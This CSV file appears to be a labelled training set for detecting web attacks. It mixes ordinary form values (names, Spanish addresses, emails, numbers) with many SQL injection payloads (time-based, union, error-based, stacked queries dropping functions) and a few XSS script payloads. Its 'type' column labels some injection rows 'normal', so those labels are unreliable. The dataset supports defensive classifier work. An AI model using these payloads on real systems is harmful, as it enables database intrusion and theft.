Text,attack_type,Label,type
"1"") where 9827=9827;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
mccaig,norm,0,normal
1258990500975774,norm,0,normal
dalenna,norm,0,normal
74ain7l,norm,0,normal
organizar,norm,0,normal
5377372403667671,norm,0,normal
painter.stovin@tetdevelocidad.bn,norm,0,normal
1')));(select * from (select(sleep(5)))acdk)#,sqli,1,sql
joelly,norm,0,normal
-4785' or (8459=8459)*4906 and 'esfn'='esfn,sqli,1,normal
50645313a,norm,0,normal
"1%')) union all select null,null,null,null--",sqli,1,sql
"1%"")) waitfor delay '0:0:5'--",sqli,1,sql
"-4811'))) union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",sqli,1,sql
orcoyen leal,norm,0,normal
2178510189723400,norm,0,normal
"-9256"")) union all select 2977,2977,2977,2977,2977,2977,2977--",sqli,1,sql
-5769) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),sqli,1,sql
alcoroches,norm,0,normal
}</style><script>a=eval;b=alert;a(b(/xss/.source));</script>,xss,2,xss
0338196248842458,norm,0,normal
2451542120615034,norm,0,normal
"-1055"" or (8459=8459)*4906 and ""kdbr""=""kdbr",sqli,1,normal
"1')) or 8466=benchmark(5000000,md5(0x694a4745)) and (('ltym'='ltym",sqli,1,normal
satandera,norm,0,normal
1%' and sleep(5) and '%'=',sqli,1,normal
conroy7,norm,0,normal
"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('sqnk'='sqnk",sqli,1,sql
"barrios de luna, los",norm,0,normal
-5861') or 1581=2611 and ('mvjh' like 'mvjh,sqli,1,normal
d1si0u544a,norm,0,normal
lerma genis,norm,0,normal
edlund@cementoscalibra.yu,norm,0,normal
neufeld,norm,0,normal
olimpia,norm,0,normal
gilburt,norm,0,normal
"1"") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
1699759073953629,norm,0,normal
-6397%' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and '%'=',sqli,1,sql
sant josep de sa talaia,norm,0,normal
-1602' or 3038=3038,sqli,1,normal
"1' in boolean mode) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)#",sqli,1,sql
"-6626%"") or 1744=5292 and (""%""=""",sqli,1,normal
"1"")) as dpln where 4193=4193 rlike sleep(5)--",sqli,1,sql
jord,norm,0,normal
34310,norm,0,normal
(select * from (select(sleep(5)))lrov),sqli,1,sql
2110,norm,0,normal
94505880f,norm,0,normal
dumensnil@bidrain.tr,norm,0,normal
1503380912783621,norm,0,normal
monzn,norm,0,normal
rubau,norm,0,normal
"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (5468=5468",sqli,1,sql
valdeprados,norm,0,normal
"c/ arc de sant ramon del call, 189, 2-e",norm,0,normal
"1'))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
c/ virgen de begoa 43,norm,0,normal
5685407082678044,norm,0,normal
57879425v,norm,0,normal
1'||(select 'tfqg' from dual where 9862=9862 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
albiol,norm,0,normal
65658514t,norm,0,normal
"etorbidea askatasuna 170, 8?a",norm,0,normal
caledonio,norm,0,normal
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli,1,normal
chatri1,norm,0,normal
23611263s,norm,0,normal
potroso,norm,0,normal
salia,norm,0,normal
defrance,norm,0,normal
abieldar,norm,0,normal
-5880')) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('rwgl'='rwgl,sqli,1,sql
1') as dqgr where 2427=2427 and (3020=3020)*6703--,sqli,1,sql
"1%';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"camino viejo de alarcos 149, 11?f",norm,0,normal
"1) union all select null,null,null,null--",sqli,1,sql
roquemore@veocime.bu,norm,0,normal
-9145') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('yvfl' like 'yvfl,sqli,1,sql
2817906891960680,norm,0,normal
santa cruz de marchena,norm,0,normal
"1) where 1443=1443 union all select null,null,null,null,null#",sqli,1,sql
"carretera de vista-rica s/n,",norm,0,normal
9sc1ti81,norm,0,normal
cenobia,norm,0,normal
segura de toro,norm,0,normal
"1"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""nnmz"" like ""nnmz",sqli,1,sql
"-2951"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))",sqli,1,sql
"1"") as mibc where 3113=3113;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1,sql
1'));if(5896=4251) select 5896 else drop function xmyk--,sqli,1,sql
"1"") as ktnq where 9005=9005;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
"1',iif(4861=6268,1,1/0)",sqli,1,normal
"1"" union all select null,null,null,null,null,null,null,null--",sqli,1,sql
sandybell,norm,0,normal
jaki,norm,0,normal
-3436) or 9281=3172,sqli,1,normal
c/ torre de romo s/n 1f,norm,0,normal
72484997z,norm,0,normal
"-2929""))) union all select 8999,8999#",sqli,1,sql
trobos 39 4e,norm,0,normal
fresno de la vega,norm,0,normal
oliv_icultora,norm,0,normal
"-5925) where 5758=5758 union all select 5758,5758,5758,5758,5758,5758,5758,5758,5758#",sqli,1,sql
"1'||(select 'neqi' where 6873=6873 union all select null,null,null,null,null,null,null--",sqli,1,sql
carolle,norm,0,normal
jaquith,norm,0,normal
"1"")) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
dawson@eco-pro.to,norm,0,normal
"1%"")) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ((""%""=""",sqli,1,sql
"1) as biup where 1414=1414 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
nakanishi@mariposasentudia.ec,norm,0,normal
30599008s,norm,0,normal
1 and (5369=8325)*8325# psze,sqli,1,normal
chen@testevelocidad.nl,norm,0,normal
"1"")) as luon where 4676=4676 rlike sleep(5)#",sqli,1,normal
"1') as wjty where 2971=2971;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
rooso,norm,0,normal
911,norm,0,normal
"1))) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (((9474=9474",sqli,1,sql
gorrochotegui blade,norm,0,normal
-7565%') or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'=',sqli,1,sql
cacahuate,norm,0,normal
9e1an906,norm,0,normal
1%' and (select * from (select(sleep(5)))fzno) and '%'=',sqli,1,sql
30827206f,norm,0,normal
"polux, 198,",norm,0,normal
valseca,norm,0,normal
60sc94o,norm,0,normal
"-8812"") where 1646=1646 union all select 1646,1646,1646,1646,1646,1646--",sqli,1,sql
"-7737'||(select 'xalo' where 9219=9219 union all select 9219,9219,9219,9219#",sqli,1,sql
batobrina.falkenstein@ebs-construcciones.sv,norm,0,normal
1';select (case when (7990=7627) then 7990 else 1/(select 0) end)--,sqli,1,sql
leni,norm,0,normal
4787579213279770,norm,0,normal
"1') as mwpp where 6192=6192;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
zohar@pablobracamonte.bh,norm,0,normal
neri,norm,0,normal
9428064689399075,norm,0,normal
plaza oficios 22,norm,0,normal
"1"" and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
yardy,norm,0,normal
seniuk,norm,0,normal
bertolda,norm,0,normal
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),sqli,1,sql
1%'))) and 1661=7683,sqli,1,normal
"1') union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
danciel,norm,0,normal
lareo robles,norm,0,normal
lefebre_heribelle@shamballa-es.by,norm,0,normal
-9202' where 9799=9799 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1,sql
schreife,norm,0,normal
47194,norm,0,normal
sweldund-pasetti@supercover.lt,norm,0,normal
"calle brasilia, 68,",norm,0,normal
"1)) as midl where 9046=9046 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1,sql
"gregoria hernandez 67, 13g",norm,0,normal
ayoroa,norm,0,normal
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('lqql'='lqql",sqli,1,normal
1av48la44r,norm,0,normal
"-3116)) as jyiq where 3875=3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",sqli,1,sql
waldemar,norm,0,normal
89590939m,norm,0,normal
"calle ter, 20,",norm,0,normal
cister grandi,norm,0,normal
"-8673"") or make_set(9354=9354,7185) and (""edap"" like ""edap",sqli,1,normal
2111,norm,0,normal
"1"") as eefe where 5290=5290 and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
san bartolom,norm,0,normal
16417,norm,0,normal
"1""))) and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (((""ruvo"" like ""ruvo",sqli,1,sql
embozalar,norm,0,normal
"1'+(select 'ixvd' where 4772=4772 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1,sql
7926381447140293,norm,0,normal
5858,norm,0,normal
12395217b,norm,0,normal
grea,norm,0,normal
ledenburg.clapp@serviconlevante.museum,norm,0,normal
46809362s,norm,0,normal
53666035c,norm,0,normal
"1) where 9213=9213 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
-9191') as qtvm where 2838=2838 or (8459=8459)*4906--,sqli,1,sql
dalfolo bauls,norm,0,normal
"1;select like('abcdefg',upper(hex(randomblob(500000000/2))))-- ygbf",sqli,1,sql
16,norm,0,normal
62st8r1a9o,norm,0,normal
5x8r0r,norm,0,normal
"-6951"" union all select 2518,2518,2518,2518,2518,2518,2518,2518--",sqli,1,sql
48289,norm,0,normal
"c/ doctor ferran, 193",norm,0,normal
"-4300"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""klbu""=""klbu",sqli,1,sql
73502486y,norm,0,normal
refriega,norm,0,normal
gerarda,norm,0,normal
"-9014%') union all select 4211,4211,4211,4211,4211,4211#",sqli,1,sql
0207128835612195,norm,0,normal
annette,norm,0,normal
lippens27,norm,0,normal
alargamiento,norm,0,normal
surroca,norm,0,normal
andi,norm,0,normal
kokoska1,norm,0,normal
navia de suarna,norm,0,normal
piero,norm,0,normal
23251820q,norm,0,normal
"calle dinamarca 14,",norm,0,normal
"zaida, la",norm,0,normal
villamuriel de cerrato,norm,0,normal
2840005774765443,norm,0,normal
01206,norm,0,normal
1)) order by 1--,sqli,1,sql
"1"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""zlwb""=""zlwb",sqli,1,normal
"1"")) waitfor delay '0:0:5' and ((""witb""=""witb",sqli,1,normal
9131603493426395,norm,0,normal
fahey@colorprint.ve,norm,0,normal
"-3219"") order by 1--",sqli,1,sql
"1"")) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ((""oxvs"" like ""oxvs",sqli,1,normal
1';select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1,sql
3540035321904498,norm,0,normal
"1);call regexp_substring(repeat(right(char(3702),0),500000000),null) and (9646=9646",sqli,1,sql
"1"" where 3318=3318;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
0222583632895914,norm,0,normal
dec7moquin3o,norm,0,normal
carnalidad,norm,0,normal
1 where 8393=8393;select (case when (9299=2760) then 1 else 9299*(select 9299 from master..sysdatabases) end)--,sqli,1,sql
-8328 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# rlva,sqli,1,sql
sevilla subauste,norm,0,normal
"1) where 5336=5336 union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
1';begin dbms_lock.sleep(5); end--,sqli,1,sql
"grupo fuensanta 197, 12?a",norm,0,normal
"-1748%""))) union all select 2987#",sqli,1,sql
ramiz,norm,0,normal
d37t30,norm,0,normal
"1"" and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ""wrbs"" like ""wrbs",sqli,1,normal
zazulak,norm,0,normal
berky,norm,0,normal
5230108987533758,norm,0,normal
bellreguard,norm,0,normal
sorts bransuel,norm,0,normal
7693499164739124,norm,0,normal
"cubo de tierra del vino, el",norm,0,normal
5739-5738,sqli,1,normal
38626822r,norm,0,normal
acho queralt,norm,0,normal
22500,norm,0,normal
stovin@escuelamontessori.zr,norm,0,normal
sinttico,norm,0,normal
"1) as jvuo where 6859=6859 union all select null,null,null,null,null,null,null#",sqli,1,sql
"c/ colinas de bellomonte, 156 6-c",norm,0,normal
"1%'))) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
"juan vazquez, 112,",norm,0,normal
cuartelar,norm,0,normal
faucette,norm,0,normal
seipue,norm,0,normal
moreno undurraga,norm,0,normal
1' waitfor delay '0:0:5',sqli,1,normal
"1"")) as fhlg where 1004=1004 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,sql
"c/ pea lara, 52, 7?b",norm,0,normal
"1%""))) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1%"")) and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
roldan,norm,0,normal
07408152j,norm,0,normal
1');select pg_sleep(5),sqli,1,sql
godofredo,norm,0,normal
"1"") as hsws where 6656=6656;waitfor delay '0:0:5'--",sqli,1,sql
1')) as cmll where 7948=7948 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
1' in boolean mode) and 5725=5552#,sqli,1,normal
riotorto,norm,0,normal
38728859x,norm,0,normal
95868852e,norm,0,normal
1')));if(3245=6168) select 3245 else drop function nafj--,sqli,1,sql
aul,norm,0,normal
5036778650405780,norm,0,normal
stoevsky,norm,0,normal
2589,norm,0,normal
"-8080"") as nlos where 8917=8917 union all select 8917,8917,8917,8917--",sqli,1,sql
4760,norm,0,normal
raiquen,norm,0,normal
conciliador,norm,0,normal
8628176776462777,norm,0,normal
"1""))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((""uzjn""=""uzjn",sqli,1,sql
7redil47ta,norm,0,normal
hasty,norm,0,normal
-7903 where 6699=6699 or 8571=8571--,sqli,1,sql
1%')));select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
hesseman.dolen@gaudio.mu,norm,0,normal
balitear,norm,0,normal
bourne_sereys8@demasiado.com.ye,norm,0,normal
"1 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)# fzni",sqli,1,sql
"1%'));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"-3442' in boolean mode) union all select 6255,6255,6255,6255,6255#",sqli,1,sql
"1%""))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((""%""=""",sqli,1,normal
carameso yabar,norm,0,normal
noemi,norm,0,normal
"-5617) where 2132=2132 union all select 2132,2132,2132,2132#",sqli,1,sql
hitchcoc,norm,0,normal
askam@maxtienda.er,norm,0,normal
"1%' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and '%'='",sqli,1,sql
"c/ serrano, 125,",norm,0,normal
<html><body>,xss,2,normal
"1')) and 3824=benchmark(5000000,md5(0x76555642)) and (('bemh'='bemh",sqli,1,normal
"-8902 union all select 4339,4339,4339#",sqli,1,sql
586,norm,0,normal
"1'))) or 8466=benchmark(5000000,md5(0x694a4745)) and ((('tpeo' like 'tpeo",sqli,1,normal
1)) order by 1#,sqli,1,normal
3175397567040813,norm,0,normal
8012,norm,0,normal
"1%""));select benchmark(5000000,md5(0x4c4d6142)) and ((""%""=""",sqli,1,sql
"1%"")))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (((""%""=""",sqli,1,sql
cassat,norm,0,normal
"calle doctor zamenhoff, 107",norm,0,normal
1')));waitfor delay '0:0:5'--,sqli,1,sql
44130,norm,0,normal
*es8a24l,norm,0,normal
1%'))) and 3916=6327--,sqli,1,sql
23130,norm,0,normal
49,norm,0,normal
1'+(select 'gtqr' where 5660=5660;select pg_sleep(5)--,sqli,1,sql
"1""))) union all select null,null,null,null,null--",sqli,1,sql
"1')));select count(*) from generate_series(1,5000000) and ((('wvzw'='wvzw",sqli,1,sql
guhl.monks@goscan.za,norm,0,normal
"-9039') union all select 8058,8058,8058,8058,8058--",sqli,1,sql
-5021'+(select yadq where 4285=4285 order by 1#,sqli,1,sql
miera,norm,0,normal
"1) where 5442=5442;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,sql
alatn,norm,0,normal
31594,norm,0,normal
estival,norm,0,normal
"-8819"") where 9119=9119 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
junmeng,norm,0,normal
amsterdam@mailboxrussia.nz,norm,0,normal
desplacib-le,norm,0,normal
1;(select * from (select(sleep(5)))srmq)# gkkx,sqli,1,sql
ablitas vilaregut,norm,0,normal
rosquiller3,norm,0,normal
maskell,norm,0,normal
5106,norm,0,normal
1') union all select null#,sqli,1,sql
25140,norm,0,normal
masapati,norm,0,normal
clar degomis,norm,0,normal
"-2314"")) or make_set(9354=9354,7185) and ((""uatq"" like ""uatq",sqli,1,normal
stavro,norm,0,normal
manay crespo,norm,0,normal
paraire credido,norm,0,normal
"1"" where 5098=5098 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--",sqli,1,sql
"1) where 2473=2473 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1,sql
albertini_trauberg@theroxyblue.jo,norm,0,normal
62745700k,norm,0,normal
enfermamente,norm,0,normal
*ramonear,norm,0,normal
spinnell@cpanelweb.com.ao,norm,0,normal
3015,norm,0,normal
15873,norm,0,normal
irregularidad,norm,0,normal
mullor campllonch,norm,0,normal
"1%""))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
40564971d,norm,0,normal
1'))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('yxpi'='yxpi,sqli,1,sql
2ontrapugnar,norm,0,normal
-1396 where 5838=5838 or 9323=9323#,sqli,1,normal
"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('ykxz'='ykxz",sqli,1,sql
"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",sqli,1,sql
"1) and 8407=(select count(*) from generate_series(1,5000000)) and (2160=2160",sqli,1,sql
zouheir,norm,0,normal
"-7469) where 5875=5875 or make_set(9354=9354,7185)--",sqli,1,sql
7627570556544379,norm,0,normal
eyre9@ringringcargo.tn,norm,0,normal
"1"") as bpmk where 4506=4506;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
erda5,norm,0,normal
9830070914840932,norm,0,normal
"1"")) or elt(6272=6272,sleep(5)) and ((""chvi"" like ""chvi",sqli,1,normal
bienfecho-r,norm,0,normal
inviolada,norm,0,normal
-5830') as fivy where 2173=2173 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,sql
"1) where 2888=2888 or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
alfi,norm,0,normal
"calle artigako haritza, s/n 8?d",norm,0,normal
19482682a,norm,0,normal
segart,norm,0,normal
marquand@eneltajo.bn,norm,0,normal
doan7,norm,0,normal
vidr,norm,0,normal
17853,norm,0,normal
522,norm,0,normal
"calle francisco monje, 94 13-d",norm,0,normal
49893169m,norm,0,normal
corbera d'ebre,norm,0,normal
"1"") as rbgl where 3822=3822 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",sqli,1,sql
"1""))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""ldlp""=""ldlp",sqli,1,sql
"1%' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and '%'='",sqli,1,sql
4126502266405093,norm,0,normal
fedora,norm,0,normal
maribeth4,norm,0,normal
"-1055' union all select 7758,7758,7758,7758,7758,7758--",sqli,1,sql
navalvillar de ibor,norm,0,normal
"1%"");select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1,sql
"-5643')) union all select 1515,1515#",sqli,1,sql
4542202458392809,norm,0,normal
filicidio,norm,0,normal
7059,norm,0,normal
04208755p,norm,0,normal
finak,norm,0,normal
"1',(select (case when (7616=7616) then 1 else 1/(select 0) end))",sqli,1,sql
younger,norm,0,normal
0278006961359320,norm,0,normal
17333,norm,0,normal
26674,norm,0,normal
8779357519103789,norm,0,normal
buenavista,norm,0,normal
45800,norm,0,normal
fulmer,norm,0,normal
valladolid,norm,0,normal
semanera,norm,0,normal
"1'))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((('tzbp'='tzbp",sqli,1,sql
86015906t,norm,0,normal
4538,norm,0,normal
">""<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",xss,2,xss
"calle daniel florido rodriguez, 105, 2?f",norm,0,normal
"cami terminal s/n,",norm,0,normal
"carrer marcos redondo, 132, 8?f",norm,0,normal
3176065165742980,norm,0,normal
"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))# fmxq",sqli,1,sql
90899794e,norm,0,normal
"camino del caliero, 75",norm,0,normal
"1""))) and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
stader-sablon6@miami-beach.ag,norm,0,normal
1'))) and 3602=1990#,sqli,1,normal
24224,norm,0,normal
barbads,norm,0,normal
"1'||(select 'ryom' where 1134=1134 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
-4484')) or 6872=6872 and (('oxuo'='oxuo,sqli,1,normal
bauls san marful,norm,0,normal
goi,norm,0,normal
"alqueria de coca 38,",norm,0,normal
ab_ogadora,norm,0,normal
berghof@esbien.bt,norm,0,normal
07947301l,norm,0,normal
"1',(select (case when (9644=9644) then dbms_pipe.receive_message(chr(75)||chr(78)||chr(104)||chr(98),5) else 1/(select 0 from dual) end) from dual)",sqli,1,sql
31830,norm,0,normal
70825753j,norm,0,normal
"1"" where 3227=3227 waitfor delay '0:0:5'--",sqli,1,sql
cisneros tauler,norm,0,normal
9768,norm,0,normal
roger,norm,0,normal
08502321a,norm,0,normal
thirugna,norm,0,normal
9387,norm,0,normal
ra0iot4248$6ica,norm,0,normal
97817650f,norm,0,normal
"1')) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('nbsr' like 'nbsr",sqli,1,normal
patoka,norm,0,normal
"1'+(select inyd where 1668=1668 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)))+'",sqli,1,sql
"1)) as faxr where 7972=7972 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1') or (select * from (select(sleep(5)))sddo)#,sqli,1,sql
"-3460%""))) or 9323=9323#",sqli,1,normal
-9072) as saot where 2278=2278 order by 1#,sqli,1,normal
39395797v,norm,0,normal
"cuerlas, las",norm,0,normal
1%')));if(9770=9748) select 9770 else drop function zyuo--,sqli,1,sql
6820667917309161,norm,0,normal
"1) where 6035=6035;select benchmark(5000000,md5(0x714e4153))#",sqli,1,sql
gen7o,norm,0,normal
trincha-32r1,norm,0,normal
1' and 7533=7533,sqli,1,normal
"1'+(select qjng where 1897=1897 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",sqli,1,sql
06928,norm,0,normal
11639,norm,0,normal
1737,norm,0,normal
"1'||(select 'osux' from dual where 7066=7066 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'",sqli,1,sql
"inocencia alayon, s/n 4-f",norm,0,normal
riguier_waits3@copiar.com.gl,norm,0,normal
"1%' union all select null,null,null,null,null#",sqli,1,sql
1')) as gfzb where 7904=7904;begin dbms_lock.sleep(5); end--,sqli,1,sql
d0l1tativ8,norm,0,normal
"1'||(select 'rfjl' where 2476=2476 or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))||'",sqli,1,sql
04210,norm,0,normal
4245052344943379,norm,0,normal
1'));select pg_sleep(5)--,sqli,1,sql
plaa sanllehy 45 6h,norm,0,normal
